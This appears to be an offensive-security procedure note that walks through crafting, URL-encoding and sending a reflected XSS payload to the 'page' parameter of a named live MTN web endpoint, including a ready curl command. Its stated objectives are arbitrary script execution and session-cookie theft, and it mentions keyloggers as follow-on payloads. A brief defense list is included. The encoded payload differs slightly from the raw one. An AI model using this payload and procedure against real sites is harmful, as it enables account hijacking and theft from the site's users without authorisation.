---
tags:
  - xss
  - payload-crafting
  - javascript-execution
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.516Z'
sub_techniques: []
id: d43fa00a-c7e9-406d-8850-fab476f42ced
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-and-Test-XSS-Payload

## Summary

This procedure details the creation and delivery of a reflected XSS payload targeting the 'page' parameter, resulting in JavaScript execution within the victim's browser. It is used to demonstrate code injection and data exfiltration in web applications lacking output encoding.

## Description

For the MTN endpoint, a payload like "><img src=x onerror=alert(document.domain)> is URL-encoded and injected into ?page=, breaking out of the HTML context to execute script. The attack scenario involves tricking a user into visiting the malicious URL, leading to session cookie theft via document.cookie access. Prerequisites: Knowledge of URL encoding and browser testing. Outcomes include alert confirmation and potential for advanced payloads like keyloggers.

## Requirements

1. URL encoder (built-in browser or online tool).
2. Web browser for payload execution.
3. Access to the vulnerable endpoint.

## Defense

Defensive measures and detection strategies:

- Sanitize all reflected inputs using libraries like OWASP ESAPI.
- Deploy Web Application Firewall (WAF) rules to block common XSS patterns.
- Enable HttpOnly and Secure flags on cookies to prevent client-side access.

## Objectives

1. Execute arbitrary JavaScript in the target context.
2. Verify exploitation via alert or console output.
3. Enable data theft for session hijacking.

## Instructions

### Step 1: Design Payload

**Context**: Create a payload that breaks HTML context and injects script.

Use payload: "><img src=x onerror=alert(document.domain)>

**Expected Output**: Payload ready for encoding.

### Step 2: URL-Encode Payload

**Context**: Encode to bypass transmission filters.

Encode as %27%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E using a tool or browser console.

**Expected Output**: Encoded string for URL insertion.

### Step 3: Inject and Test

**Context**: Append to vulnerable parameter and access URL.

Execute [[commands/curl-xss-test]] to send the request:

```bash
curl "https://play.mtn.co.za/callertunez/?page=2%27%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E" -v
```

> This simulates the request; in a browser, visit the URL to see the alert.

**Expected Output**: JavaScript alert with domain name.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-xss-test]]

## Tools Used


## Tags

- xss
- payload-injection
